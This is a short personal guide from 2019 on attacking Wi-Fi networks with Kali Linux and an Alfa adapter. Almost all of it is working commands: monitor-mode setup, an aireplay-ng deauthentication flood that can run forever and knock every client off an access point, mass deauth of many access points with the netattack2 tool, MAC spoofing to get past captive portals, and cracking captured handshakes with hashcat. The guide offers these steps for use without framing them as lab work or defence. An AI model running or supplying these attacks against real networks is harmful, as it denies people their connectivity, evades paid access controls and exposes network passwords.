---
title: Deauth Wifi Guide 11/19/2019
---

Setup
=====

First make sure that you have the alfa card with you and you have the correct
drivers installed (I am using alfa AWUS036ACH and kali linux 2019.3)

apt-get update

apt install realtek-rtl88xxau-dkms

Then reboot and plug in to usb

Ifconfig

Check if it is plugged in and working. SHould be wlan0 if on vm or wlan1 if on
laptop

Now set it up into monitor mode

ifconfig wlan1 down

airmon-ng check kill

(it seems you only have to do this if using wlan0) check
https://forums.kali.org/showthread.php?27091-Solve-arimon-ng-issues-by-a-simple-modfication-of-NetworkManager-conf

iwconfig wlan1 mode monitor

ifconfig wlan1 up

Now check if it is in monitor mode

airodump-ng wlan1

Check if it supports injection

aireplay-ng -9 wlan1

Actual deauth (Single AP)
=========================

1.  Put wifi card or adapter into monitor mode

ifconfig wlan1 down

airmon-ng check kill

iwconfig wlan1 mode monitor

ifconfig wlan1 up

1.  Use airodump to capture packets

airodump-ng wlan1mon

1.  Capture packets from specific bssid (wifi to deauth) and a specific channel

airodump-ng --bssid (insert bssid) -c (insert channel) -w (filename to save as)
wlan1

1.  Use aireplay-ng to send the deauth packets

Aireplay-ng -0(deauth) 0(forever) -a (mac address/bssid of the access point) -c
(mac address of the client to deauth, if you leave blank then all clients are
deauthed) wlan1mon

Deauth multiple APs (NetAttack2)
================================

<https://github.com/chrizator/netattack2.git>

cd netattack2

python netattack2.py

Restart wifi stuff
==================

Ifconfig wlan1 down

Iwconfig wlan1 mode managed

Ifconfig wlan1 up

NetworkManager restart

Then unplug and plug back in wifi adapter

MAC ADDRESS CHANGER FOR CAPTIVE PORTALS
=======================================

airodump-ng -c (channel or use bssid) -a (for only connected devices to list)
--encrypt OPN wlan1

ifconfig wlan1 down

macchanger -m (Mac address to spoof) wlan1

ifconfig wlan1 up

<https://null-byte.wonderhowto.com/how-to/hack-open-hotel-airplane-coffee-shop-wi-fi-with-mac-address-spoofing-0183387/>

CRACK CAP FILE PASSWORD
=======================

cap2hccapx file.cap (file/destination).hccapx

hashcat -o 2500 (filename like cracked) (file/destination of hccapx) (wordlist)
